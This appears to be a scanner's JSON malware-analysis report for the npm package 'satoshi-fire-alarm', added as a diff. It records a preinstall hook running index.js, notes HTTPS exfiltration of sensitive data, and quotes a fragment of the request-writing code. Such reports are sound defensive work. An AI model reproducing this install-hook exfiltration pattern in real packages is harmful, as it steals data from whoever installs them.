@@ -1,0 +1,43 @@
+{
+  "package_metadata": {
+    "name": "satoshi-fire-alarm",
+    "version": "99.10.10"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/index.js:129",
+        "details": "Exfiltrating sensitive data via HTTPS request."
+      },
+      {
+        "location": "package/index.js:139",
+        "details": "Writing sensitive data to the outgoing request."
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/package.json:8",
+        "details": "Preinstall script found that runs 'node index.js'."
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/index.js",
+        "code_snippet": "var req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n});\nreq.write(postData);"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "indicators": [
+      "Exfiltration of sensitive data detected.",
+      "Preinstall script executes arbitrary JavaScript code.",
+      "Network activity includes suspicious outbound HTTPS requests."
+    ]
+  }
+}
